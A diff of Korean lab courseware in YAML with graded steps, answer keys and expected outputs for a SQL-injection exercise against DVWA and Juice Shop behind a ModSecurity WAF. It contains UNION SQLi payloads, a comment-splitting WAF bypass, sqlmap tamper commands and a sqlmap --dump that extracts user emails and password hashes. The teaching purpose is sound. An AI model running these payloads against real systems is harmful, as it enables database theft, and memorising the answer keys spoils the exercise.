@@ -86,13 +86,14 @@ steps:
       - **브라우저(학생 PC):** 주소창에 아래를 붙여넣고 열면 dvwa(차단 모드)는 **`403 Forbidden` 페이지**가 뜬다.
         `http://dvwa.el34.lab/?id=1' UNION SELECT user,password FROM users-- -`
       - **Burp Repeater:** 위 요청을 Repeater 로 보내면 응답 코드·본문(403 차단 페이지)을 그대로 본다(WAF 응답 분석에 유용).
-      - **CLI(채점용, 내 공격 VM 에서):**
+      - **CLI(채점용, 내 공격 VM 에서) — 진짜 SQLi 도구 sqlmap 으로:**
         ```bash
         ssh att@192.168.0.202
-        echo "dvwa=$(echo -en 'GET /?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
+        # sqlmap이 UNION/quote 등 SQLi 페이로드를 자동 발사 → 차단형 dvwa는 WAF가 전부 403으로 막는다
+        sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'
         ```
-      해석: UNION SELECT 가 CRS 942(SQLi)에 매치돼 anomaly 누적 → 949110 차단(403). 고전 평문 SQLi 는 CRS 가 가장 쉽게 잡는다.
-      - payload `1' UNION SELECT user,password FROM users-- -`(URL 인코딩: `%27`=`'`, `%20`=공백, 끝 `-- -`=SQL 주석). dvwa vhost=`SecRuleEngine On`(차단 모드).
+      해석: sqlmap 이 던지는 SQLi 페이로드(UNION·작은따옴표 등)가 CRS 942(SQLi)에 매치돼 anomaly 누적 → 949110 차단(403). sqlmap 스스로 "WAF/IPS 로 보호됨"을 감지하고 `--tamper` 를 권한다 — 고전 평문 SQLi 는 CRS 가 가장 쉽게 잡는다.
+      - sqlmap 이 보내는 payload 예 `1' UNION SELECT user,password FROM users-- -`(`%27`=`'`, 끝 `-- -`=SQL 주석). dvwa vhost=`SecRuleEngine On`(차단 모드)라 전 페이로드가 403.
 
       ## ✅ 합격 기준
       `403` 출력 시 통과. **근거:** UNION SQLi 가 dvwa 에서 403(WAF 차단)으로 응답되면 통과 — 평문 SQLi 는
@@ -101,135 +102,133 @@ steps:
     category: manipulation
     points: 12
     answer: |
-      # 1) 수동 UNION SQLi(users 계정/비번 추출 시도) — 차단형 dvwa 응답코드
-      echo "dvwa=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")"
-    answer_detail: "UNION-based SQLi 는 다른 테이블을 결과에 합쳐 추출하는 가장 직접적인 기법이다. dvwa(SecRuleEngine On)에서는 payload 가 942 룰군(SQLi 변형)에 매치되고 anomaly score 가 누적돼 949110(임계치 도달)이 발동, 403 으로 차단된다. 브라우저/Burp로 열면 403 Forbidden 페이지를 직접 본다. 평문 SQLi 는 CRS 가 가장 쉽게 잡는다는 점을 403 응답으로 판정한다."
+      # 1) sqlmap SQLi 자동 발사 — 차단형 dvwa는 WAF가 전부 403 차단(sqlmap이 WAF/IPS 감지)
+      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'"
+    answer_detail: "UNION-based SQLi 는 다른 테이블을 결과에 합쳐 추출하는 가장 직접적인 기법이다. 진짜 SQLi 도구 sqlmap 으로 dvwa(SecRuleEngine On)를 치면, sqlmap 이 던지는 SQLi 페이로드(UNION·작은따옴표 등)가 942 룰군에 매치되고 anomaly score 가 누적돼 949110(임계치)이 발동, 전부 403 으로 차단된다. sqlmap 스스로 'WAF/IPS 로 보호된다'고 감지하고 '--tamper' 를 권하며, 'all tested parameters do not appear to be injectable' + '403 (Forbidden) - N times' 로 보고한다. 평문 SQLi 는 CRS 가 가장 쉽게 잡는다는 점을 sqlmap 의 WAF 차단(403) 보고로 판정한다."
     expected_output: |
-      dvwa=403
+      [09:11:24] [INFO] checking if the target is protected by some kind of WAF/IPS
+      [09:11:26] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+      403 (Forbidden) - 75 times
     verify:
       type: output_contains
       expect: '403'
       field: stdout
       semantic:
-        intent: "수동 UNION SQLi + WAF 차단"
-        success_criteria: ["UNION SELECT", "403 차단"]
-        acceptable_methods: ["**[OSS] UNION SQLi → 403 (권장)**"]
+        intent: "sqlmap SQLi + WAF 차단"
+        success_criteria: ["sqlmap SQLi 발사", "WAF 403 차단"]
+        acceptable_methods: ["**[OSS] sqlmap → WAF 403 (권장)**"]
     target_vm: web
 
   - order: 3
     instruction: |
-      ## 🎯 WAF 우회(tamper) 시도 — 무엇이 막히고 무엇이 뚫리나
-      payload 를 변형해 WAF 시그니처를 피하는 시도가 tamper 다. 두 고전 기법을 직접 넣어 **어느 쪽이
-      막히고 어느 쪽이 뚫리는지** 실측한다 — 대소문자 섞기(`UnIoN sElEcT`)와 키워드 사이 주석 삽입
-      (`UN/**/ION SE/**/LECT`). 둘 다 DB 는 정상 실행하지만 단순 시그니처는 못 알아본다.
+      ## 🎯 WAF 우회(tamper) 자동화 — sqlmap --tamper
+      payload 를 변형해 WAF 시그니처를 피하는 것이 tamper 다. sqlmap 은 `--tamper=<스크립트>` 로 이 변형을
+      자동화한다 — `space2comment`(공백→`/**/` 주석분할, `UN/**/ION`)·`charencode`·`charunicodeencode`·
+      `versionedmorekeywords` 등. 스캐너가 tamper 를 써도 이 CRS 를 넘는지 실측한다.
 
       ## 📖 개념 한 줄
-      ModSec CRS 는 검사 전 입력을 표준형으로 되돌리는 정규화(normalization)를 한다. 대소문자 변형은
-      정규화로 복원돼 **여전히 차단(403)** 된다. 그러나 이 el34 CRS 3.3.2 의 SQLi 탐지(libinjection)는
-      키워드 사이 주석 분할을 못 복원해 **주석삽입은 실제로 우회(302)** 된다 — "정규화가 모든 변형을
-      잡는다"는 통념이 깨지는 실측 사례다(우회 성공이 곧 더 강력한 교훈).
+      ModSec CRS 는 검사 전 입력을 표준형으로 되돌리는 정규화(normalization) + anomaly scoring 으로
+      운영된다. 손으로 정밀하게 만든 **단 하나**의 주석분할 payload 는 이 CRS 3.3.2 의 libinjection 빈틈으로
+      302 통과할 수 있으나, sqlmap 처럼 수십 개 probe 를 함께 쏘는 **자동 스캐너는 tamper 를 써도** 그 총합이
+      942 에 걸려 여전히 차단(403)된다 — "tamper 만 걸면 뚫린다"는 통념이 깨지는 실측 사례다(자동화 ≠ 은밀).
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) 대소문자 tamper — UnIoN sElEcT (정규화로 복원되어 차단되는지)
-      K=$(echo -en 'GET /?id=1%27%20UnIoN%20sElEcT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
-      echo "case=$K"
-      # 2) 주석삽입 tamper — UN/**/ION SE/**/LECT (키워드 사이 주석으로 토큰을 깨뜨림)
-      C=$(echo -en 'GET /?id=1%27%20UN/**/ION%20SE/**/LECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
-      echo "comment=$C"
-      # 3) 판정 — 주석삽입이 차단(403)도 무응답(000)도 아니면 우회 성공
-      if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석삽입 우회 성공(comment=$C): 정규화가 주석분할은 못 잡음"; else echo "→ 주석삽입 차단/무응답(comment=$C)"; fi
-      # 4) 대조 — 대소문자는 정규화로 복원돼 차단(403)
-      echo "→ 대조: 대소문자(case=$K)는 정규화로 복원돼 차단. tamper도 기법마다 결과가 다르다"
+      # sqlmap의 tamper 스크립트로 WAF 우회 자동화 — space2comment는 공백을 /**/(인라인 주석)으로 바꿔
+      # UN/**/ION 형태를 만든다(다른 변형: charencode·charunicodeencode·versionedmorekeywords)
+      sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --tamper=space2comment --disable-coloring 2>&1 | grep -iE "loading tamper|WAF/IPS|do not appear to be injectable|403 \(Forbidden\)"
       ```
-      > 💡 **브라우저/Burp로 두 요청을 각각 보내 화면으로 대조하는 게 실전이다** — 대소문자
-      > (`http://dvwa.el34.lab/?id=1' UnIoN sElEcT 1--`)는 **403 Forbidden 페이지**, 주석삽입
-      > (`.../?id=1' UN/**/ION SE/**/LECT 1--`)은 **통과(302 리다이렉트)**. Burp Repeater 로 나란히 보내면
-      > 두 응답 차이가 한눈에 보인다. 위 nc 요청은 그 응답코드를 CLI로 뽑아 판정 로직에 쓰는 것.
+      해석: sqlmap 이 `space2comment` tamper 모듈을 로드해(공백→`/**/`) 주석분할 우회를 자동 시도하지만,
+      dvwa 는 여전히 **403** 을 돌려준다 — sqlmap 은 한 payload 가 아니라 수십 개 probe(작은따옴표·괄호·키워드)를
+      한꺼번에 쏘고, CRS 의 anomaly scoring 이 그 **총합**을 잡기 때문이다. tamper 는 진입장벽을 높일 뿐 자동
+      스캐너를 투명하게 만들진 못한다(자동화 ≠ 은밀).
+      > 💡 **개념(libinjection 빈틈):** 손으로 정밀하게 만든 **단 하나**의 주석분할 payload
+      > (`1' UN/**/ION SE/**/LECT 1--`, raw 요청·정확한 인코딩)는 이 CRS 3.3.2 의 libinjection 이 토큰을 복원
+      > 못 해 백엔드로 통과(302)할 수 있다. 그러나 sqlmap·ffuf·wfuzz 같은 자동 도구는 payload 를 재인코딩
+      > (`%`→`%25`)하거나 다른 probe 를 함께 쏘아 결국 942 에 걸린다 — **실전 우회는 자동화가 아니라 수작업 정밀도**가 관건이다.
 
-      - `UnIoN sElEcT`(대소문자 섞기 — 정규화로 복원→403), `UN/**/ION SE/**/LECT`(SQL 인라인 주석 `/**/` 삽입 — libinjection 미복원→302 우회).
+      - `--tamper=space2comment`(공백→`/**/` 주석분할), 다른 변형 `--tamper=charencode`/`charunicodeencode`/`versionedmorekeywords`. dvwa=`SecRuleEngine On` 이라 스캐너는 tamper 를 써도 403.
 
       ## ✅ 합격 기준
-      `우회 성공` 출력 시 통과. **근거:** 실측상 대소문자(case=403)는 차단되지만 주석삽입(comment=302)은
-      이 CRS 를 우회한다 — 두 결과의 대조로 "정규화가 모든 변형을 잡지는 못함"을 확인(우회가 안 되면 미통과).
-    hint: 'UN/**/ION, UnIoN tamper → 결과'
+      `tamper` 출력 시 통과. **근거:** sqlmap 이 tamper 모듈(space2comment)을 로드해 WAF 우회를 자동 시도하고
+      그 결과(여기선 여전히 403 차단)를 보고하면 통과 — 자동 스캐너는 tamper 로도 CRS 의 anomaly scoring 을
+      넘기 어렵고, 정밀한 단발 우회는 수작업 몫이다.
+    hint: 'sqlmap --tamper=space2comment'
     category: manipulation
     points: 14
     answer: |
-      # 1) 대소문자 tamper — UnIoN sElEcT (정규화로 복원되어 차단되는지)
-      K=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20UnIoN%20sElEcT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")
-      echo "case=$K"
-      # 2) 주석삽입 tamper — UN/**/ION SE/**/LECT (키워드 사이 주석으로 토큰을 깨뜨림)
-      C=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20UN/**/ION%20SE/**/LECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")
-      echo "comment=$C"
-      # 3) 판정 — 주석삽입이 차단(403)도 무응답(000)도 아니면 우회 성공
-      if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석삽입 우회 성공(comment=$C): 정규화가 주석분할은 못 잡음"; else echo "→ 주석삽입 차단/무응답(comment=$C)"; fi
-      # 4) 대조 — 대소문자는 정규화로 복원돼 차단(403)
-      echo "→ 대조: 대소문자(case=$K)는 정규화로 복원돼 차단. tamper도 기법마다 결과가 다르다"
-    answer_detail: "tamper 의 두 결과를 대조한다. 대소문자(UnIoN)는 ModSec CRS 의 정규화로 UNION 으로 복원돼 여전히 942 룰에 차단(403). 그러나 키워드 사이 주석 분할(UN/**/ION)은 이 el34 CRS 3.3.2 의 libinjection 이 토큰을 복원하지 못해 실제로 우회(302)된다. '정규화가 모든 변형을 잡는다'는 통념과 달리 주석삽입은 유효한 우회 경로다 — 판정은 comment 응답이 차단(403)이 아닌 우회임을 게이트한다(대소문자 차단·주석삽입 우회의 대조가 핵심)."
+      # sqlmap tamper(space2comment)로 WAF 우회 자동화 — 스캐너는 tamper를 써도 여전히 403 차단
+      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --tamper=space2comment --disable-coloring 2>&1 | grep -iE 'loading tamper|WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'"
+    answer_detail: "진짜 SQLi 도구 sqlmap 의 --tamper 로 WAF 우회를 자동화한다 — space2comment 는 공백을 /**/(인라인 주석)으로 바꿔 UN/**/ION 주석분할을 만든다(다른 변형: charencode·charunicodeencode·versionedmorekeywords). sqlmap 이 tamper 모듈을 로드하지만 dvwa 는 여전히 403 — sqlmap 은 한 payload 가 아니라 수십 개 probe(작은따옴표·괄호·키워드)를 함께 쏘고 CRS 의 anomaly scoring 이 그 총합을 잡기 때문이다. 개념: 손으로 정밀하게 만든 단 하나의 주석분할 payload(raw 요청·정확한 인코딩)는 이 CRS 3.3.2 의 libinjection 빈틈으로 302 통과할 수 있으나, 자동 도구는 payload 를 재인코딩(%→%25)하거나 다른 probe 를 함께 쏘아 결국 942 에 걸린다 — 실전 우회는 자동화가 아니라 수작업 정밀도가 관건이다. 채점은 출력에 'tamper'(모듈 로드)가 보이는지로 판정한다."
     expected_output: |
-      case=403
-      comment=302
-      → 주석삽입 우회 성공(comment=302): 정규화가 주석분할은 못 잡음
-      → 대조: 대소문자(case=403)는 정규화로 복원돼 차단. tamper도 기법마다 결과가 다르다
+      [09:13:09] [INFO] loading tamper module 'space2comment'
+      [09:13:09] [INFO] checking if the target is protected by some kind of WAF/IPS
+      [09:13:11] [ERROR] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+      403 (Forbidden) - 76 times
     verify:
       type: output_contains
-      expect: '우회 성공'
+      expect: 'tamper'
       field: stdout
       semantic:
-        intent: "WAF tamper — 차단(대소문자)과 우회(주석삽입) 대조"
-        success_criteria: ["대소문자 403 차단", "주석삽입 302 우회"]
-        acceptable_methods: ["**[OSS] tamper 변형별 응답 비교 (권장)**"]
+        intent: "sqlmap --tamper WAF 우회 자동화 + CRS 차단"
+        success_criteria: ["tamper 모듈 로드", "스캐너도 CRS에 403"]
+        acceptable_methods: ["**[OSS] sqlmap --tamper (권장)**"]
     target_vm: web
 
   - order: 4
     instruction: |
-      ## 🎯 sqlmap 자동화 — 한 파라미터를 4 기법으로
+      ## 🎯 sqlmap 자동화 — 실제 데이터 추출(--dump)
       수동 시도를 자동화 도구로 대체한다. sqlmap 은 대상 URL 의 한 파라미터를 4 기법(Boolean/Time/
-      UNION/Error)으로 자동 주입해 취약 여부를 판별한다. 여기서는 juiceshop 의 REST 검색 파라미터
-      `/rest/products/search?q=` 를 대상으로 한다(juice 는 W03 에서 본 API 구조). 자동화의 위력과
-      동시에 "매우 시끄럽다"(다량 비정상 요청으로 WAF/IDS 에 다수 탐지)는 특성을 체감한다.
+      UNION/Error)으로 자동 주입해 취약점을 찾고, `--dump` 로 **테이블 데이터를 실제로 추출**한다. 대상은
+      juiceshop 의 REST 검색 파라미터 `/rest/products/search?q=`(juice 는 W03 에서 본 API 구조). juice 는
+      DetectionOnly(탐지만) 라 SQLi 가 통과해 실제 계정/비밀번호가 뽑히는 것을 눈으로 본다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # sqlmap으로 juice 검색 파라미터를 4기법(boolean/time/union/error) 자동 테스트(40초 제한)
-      timeout 40 sqlmap -u 'http://juice.el34.lab/rest/products/search?q=test' --batch --level=1 --risk=1 --flush-session 2>&1 | grep -iE 'parameter|testing|sqlmap' | head -6
+      # sqlmap이 juice 검색 파라미터의 SQLi를 자동으로 찾아 Users 테이블의 실제 계정/비밀번호를 추출(--dump)
+      sqlmap -u 'http://juice.el34.lab/rest/products/search?q=apple' --batch --dbms=sqlite --technique=B --threads 10 -T Users -C email,password --dump --stop 2 --disable-coloring 2>&1 | grep -E 'Parameter: q|Type:|@juice-sh.op|0192023|Table: Users|email' | head
       ```
-      출력의 `testing` 라인을 **직접 읽고 판단한다** — sqlmap 이 파라미터를 4기법으로 자동 테스트 중이다.
-      빠르지만 한 파라미터에 수십~수백 개 비정상 요청을 보내 WAF/IDS 에 다량 탐지된다("빠르지만 들키는" 도구).
+      juice 는 DetectionOnly(탐지만·차단 안 함)라 sqlmap 의 SQLi 가 통과해 **실제 데이터가 추출**된다 —
+      출력에 `Parameter: q` 취약 확인과 Users 테이블의 email·password(MD5 해시)가 표로 뜬다. `0192023a...b500`
+      은 juice 관리자 계정 해시(=admin123)다. 자동화는 강력하지만 한 파라미터에 수십~수백 요청을 보내
+      WAF/IDS 에 다량 탐지된다("빠르지만 들키는" 도구).
 
-      - `-u 'http://juice.el34.lab/...'`(대상, 자연 URL — 호스트명이 vhost 지정), `--batch`(무인), `--level=1`/`--risk=1`(범위·공격성), `--flush-session`(캐시 비움), `timeout 40`(40초 제한).
+      - `--dump -T Users -C email,password`(추출 대상), `--dbms=sqlite`(juice 백엔드), `--technique=B`(불리언 블라인드, 빠름), `--threads 10`(병렬), `--stop 2`(2행만 — 데모), `--batch`(무인).
 
       ## ✅ 합격 기준
-      `testing` 출력 시 통과. **근거:** sqlmap 이 파라미터 자동 테스트를 시작해 testing 라인이 나타나면
-      통과(timeout 40 으로 완주 못 해도 시작 자체가 합격) — 자동화는 빠르지만 매우 시끄럽다.
-    hint: 'sqlmap --batch 자동 테스트'
+      `@juice-sh.op` 출력 시 통과. **근거:** sqlmap 이 juice 의 SQLi 로 Users 테이블을 실제 추출해 계정
+      이메일(`...@juice-sh.op`)·비밀번호 해시가 표로 나오면 통과 — DetectionOnly 라 페이로드가 통과해
+      진짜 데이터가 유출된다(자동화는 강력하나 시끄럽다).
+    hint: 'sqlmap --dump 실데이터 추출'
     category: recon
     points: 12
     answer: |
-      # 1) sqlmap으로 juice 검색 파라미터를 4기법(boolean/time/union/error) 자동 테스트(40초 제한)
-      ssh att@192.168.0.202 "timeout 40 sqlmap -u 'http://juice.el34.lab/rest/products/search?q=test' --batch --level=1 --risk=1 --flush-session 2>&1 | grep -iE 'parameter|testing|sqlmap' | head -6"
-    answer_detail: "sqlmap 은 한 파라미터를 4 기법(Boolean/Time/UNION/Error)으로 자동 주입해 SQLi 를 탐지·악용하는 도구다(--tamper 로 WAF 우회 변형까지 자동화). 효율적이지만 한 파라미터 검증에 수십~수백 개의 비정상 요청을 보내므로 WAF/IDS 에 다량 탐지된다 — '빠르지만 들키는' 도구다. 출력의 testing 라인(파라미터 테스트 시작)으로 자동화 동작을 판정한다(timeout 40 으로 완주 못 해도 시작 자체가 합격)."
+      # 1) sqlmap이 juice 검색 파라미터의 SQLi로 Users 테이블 실제 계정/비밀번호 추출(--dump)
+      ssh att@192.168.0.202 "sqlmap -u 'http://juice.el34.lab/rest/products/search?q=apple' --batch --dbms=sqlite --technique=B --threads 10 -T Users -C email,password --dump --stop 2 --disable-coloring 2>&1 | grep -E 'Parameter: q|Type:|@juice-sh.op|0192023|Table: Users|email' | head"
+    answer_detail: "sqlmap 은 한 파라미터를 4 기법(Boolean/Time/UNION/Error)으로 자동 주입해 SQLi 를 탐지하고 --dump 로 테이블 데이터를 실제 추출하는 도구다. juice(DetectionOnly)는 SQLi 를 차단하지 않으므로 sqlmap 이 Parameter q 를 boolean/time-based blind 로 확인하고 Users 테이블의 email·password(MD5)를 표로 뽑아낸다 — 0192023a7bbd73250516f069df18b500 은 관리자 계정 해시(=admin123). 효율적이지만 한 파라미터에 수십~수백 개 비정상 요청을 보내 WAF/IDS 에 다량 탐지되는 '빠르지만 들키는' 도구다. 출력의 계정 이메일(@juice-sh.op)로 실제 데이터 추출을 판정한다."
     expected_output: |
-      |_|V...       |_|   https://sqlmap.org
-      [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-      [14:42:08] [INFO] testing URL 'http://juice.el34.lab/rest/products/search?q=test'
-      [14:42:08] [INFO] using '/root/.local/share/sqlmap/output/results-06262026_0242pm.csv' as the CSV results file in multiple targets mode
-      [14:42:08] [INFO] testing connection to the target URL
-      [14:42:08] [INFO] testing if the target URL content is stable
-      → sqlmap이 파라미터를 자동 테스트(boolean
+      Parameter: q (GET)
+          Type: boolean-based blind
+      Database: <current>
+      Table: Users
+      +------------------------+----------------------------------+
+      | email                  | password                         |
+      +------------------------+----------------------------------+
+      | J12934@juice-sh.op     | 0192023a7bbd73250516f069df18b500 |
+      | accountant@juice-sh.op | e541ca7ecf72b8d1286474fc613e5e45 |
+      +------------------------+----------------------------------+
     verify:
       type: output_contains
-      expect: 'testing'
+      expect: '@juice-sh.op'
       field: stdout
       semantic:
-        intent: "sqlmap 자동화"
-        success_criteria: ["sqlmap 실행/테스트"]
-        acceptable_methods: ["**[OSS] sqlmap --batch (권장)**"]
+        intent: "sqlmap 자동 SQLi + 실제 데이터 추출"
+        success_criteria: ["sqlmap 취약 확인", "Users 테이블 계정/비번 추출"]
+        acceptable_methods: ["**[OSS] sqlmap --dump (권장)**"]
     target_vm: web
 
   - order: 5
@@ -293,42 +292,46 @@ steps:
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) 같은 SQLi payload를 dvwa(차단 모드)로 — 응답코드
-      echo -n "dvwa=$(echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}') "
-      # 2) 같은 payload를 juice(DetectionOnly)로 — 응답코드
-      echo "juice=$(echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
-      # 3) 해석 — dvwa=403(차단)/juice=200(탐지만), 같은 공격 다른 결과 = WAF 정책 차이
+      # 같은 sqlmap SQLi를 두 vhost에 — dvwa(차단)는 WAF가 막고, juice(탐지만)는 통과해 취약 확인
+      echo "[dvwa 차단 모드]"; sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --flush-session --disable-coloring 2>&1 | grep -iE 'do not appear to be injectable|403 \(Forbidden\)' | head -2
+      echo "[juice DetectionOnly]"; sqlmap -u 'http://juice.el34.lab/rest/products/search?q=apple' --batch --dbms=sqlite --technique=B --disable-coloring 2>&1 | grep -iE 'Parameter: q|Type:|back-end DBMS' | head -3
       ```
-      > 💡 **브라우저로 같은 공격 URL 두 개를 각각 열어 화면으로 대조한다** —
-      > `http://dvwa.el34.lab/?id=1' UNION SELECT 1--` 은 **403 Forbidden**, `http://juice.el34.lab/?id=1' UNION SELECT 1--`
-      > 은 **정상 페이지(200)** 로 통과한다. 같은 payload, 호스트명만 다른데 결과가 갈리는 걸 눈으로 본다.
-      > (Burp로 두 요청을 보내 응답을 비교해도 동일.) 위 nc 요청은 그 코드를 CLI로 뽑는 것.
+      같은 진짜 SQLi 도구(sqlmap)를 두 vhost 에 돌리면 결과가 갈린다 — dvwa 는 WAF 가 sqlmap 의 페이로드를
+      403 으로 막아 "not injectable" 로 보고되지만, juice 는 DetectionOnly 라 그대로 통과해 sqlmap 이
+      `Parameter: q` 를 취약(boolean/time-based blind)으로 확정한다. 같은 공격, 호스트명만 다른데 한쪽은
+      막히고 한쪽은 뚫리는 건 ModSec 운영 모드 차이다.
+      > 💡 **브라우저로도 대조:** `http://juice.el34.lab/?id=1' UNION SELECT 1--` 은 정상 통과(탐지만), 같은
+      > 요청을 `dvwa.el34.lab` 으로 보내면 **403 Forbidden**. 같은 payload, 호스트명만 다른데 결과가 갈린다.
 
-      - 두 요청의 payload(`1' UNION SELECT 1--`)는 동일, 다른 것은 Host 헤더(vhost)뿐. 같은 web 컨테이너가 두 vhost 를 호스팅하나 ModSec 모드가 달라 결과가 갈린다.
+      - 같은 sqlmap 공격이 대상이 다르다 — dvwa(`SecRuleEngine On`, 차단) vs juice(`DetectionOnly`, 탐지만). 같은 web 컨테이너가 두 vhost 를 호스팅하나 ModSec 모드가 달라 결과가 갈린다.
 
       ## ✅ 합격 기준
-      `juice=200` 출력 시 통과. **근거:** 같은 SQLi 가 dvwa=403(차단)과 juice=200(탐지만)으로 다르게
-      응답되면 통과 — juice 의 200 은 우회 성공이 아니라 audit log 에 남는 모니터링 모드일 뿐이다.
-    hint: '같은 payload dvwa 403 vs juice 200'
+      `Parameter: q` 출력 시 통과. **근거:** 같은 sqlmap SQLi 가 dvwa 에선 WAF 에 막혀 not injectable(403),
+      juice 에선 `Parameter: q` 취약으로 확정되면 통과 — juice 의 통과는 우회 성공이 아니라 audit log 에
+      남는 모니터링(DetectionOnly) 모드일 뿐이다.
+    hint: '같은 sqlmap: dvwa 차단 vs juice 취약'
     category: analysis
     points: 12
     answer: |
-      # 1) 같은 SQLi payload를 dvwa(차단 모드)로 — 응답코드
-      echo -n "dvwa=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'") "
-      # 2) 같은 payload를 juice(DetectionOnly)로 — 응답코드
-      echo "juice=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")"
-      # 3) 해석 — dvwa=403(차단)/juice=200(탐지만), 같은 공격 다른 결과 = WAF 정책 차이
-    answer_detail: "완전히 같은 payload 인데 WAF 운영 모드가 결과를 가른다 — dvwa(SecRuleEngine On)는 룰 매치 시 실제로 끊어 403, juice(DetectionOnly)는 탐지·기록만 하고 막지 않아 200. juice 의 200 은 우회 성공이 아니라 audit log 에 흔적이 남는 모니터링 모드일 뿐이다. 차단 vs 모니터링은 운영 정책의 선택이며, juice=200 확인으로 모드 차이를 판정한다."
+      # 같은 sqlmap SQLi를 두 vhost에 — dvwa(차단)는 WAF가 막고, juice(탐지만)는 통과해 취약 확인
+      ssh att@192.168.0.202 "echo '[dvwa 차단 모드]'; sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --flush-session --disable-coloring 2>&1 | grep -iE 'do not appear to be injectable|403 \(Forbidden\)' | head -2; echo '[juice DetectionOnly]'; sqlmap -u 'http://juice.el34.lab/rest/products/search?q=apple' --batch --dbms=sqlite --technique=B --disable-coloring 2>&1 | grep -iE 'Parameter: q|Type:|back-end DBMS' | head -3"
+    answer_detail: "완전히 같은 진짜 SQLi 도구(sqlmap)를 두 vhost 에 돌려도 WAF 운영 모드가 결과를 가른다 — dvwa(SecRuleEngine On)는 sqlmap 의 페이로드를 403 으로 끊어 'do not appear to be injectable'로 보고되고, juice(DetectionOnly)는 탐지·기록만 하고 막지 않아 sqlmap 이 Parameter q 를 취약(boolean/time-based blind)으로 확정한다. juice 의 통과는 우회 성공이 아니라 audit log 에 흔적이 남는 모니터링 모드일 뿐이다. 차단 vs 모니터링은 운영 정책의 선택이며, juice 의 Parameter q 취약 확정으로 모드 차이를 판정한다."
     expected_output: |
-      dvwa=403 juice=200
+      [dvwa 차단 모드]
+      [09:20:01] [ERROR] all tested parameters do not appear to be injectable...
+      403 (Forbidden) - 75 times
+      [juice DetectionOnly]
+      Parameter: q (GET)
+          Type: boolean-based blind
+      back-end DBMS: SQLite
     verify:
       type: output_contains
-      expect: 'juice=200'
+      expect: 'Parameter: q'
       field: stdout
       semantic:
-        intent: "차단 vs 탐지만 모드 차이"
-        success_criteria: ["dvwa 403", "juice 200", "WAF 모드 이해"]
-        acceptable_methods: ["**[OSS] dvwa vs juice 비교 (권장)**"]
+        intent: "차단 vs 탐지만 모드 차이(같은 sqlmap)"
+        success_criteria: ["dvwa WAF 차단", "juice 취약 확정", "WAF 모드 이해"]
+        acceptable_methods: ["**[OSS] sqlmap dvwa vs juice (권장)**"]
     target_vm: web
 
   - order: 7
@@ -397,9 +400,9 @@ steps:
       ```
       # 공격 W04 SQLi 보고서
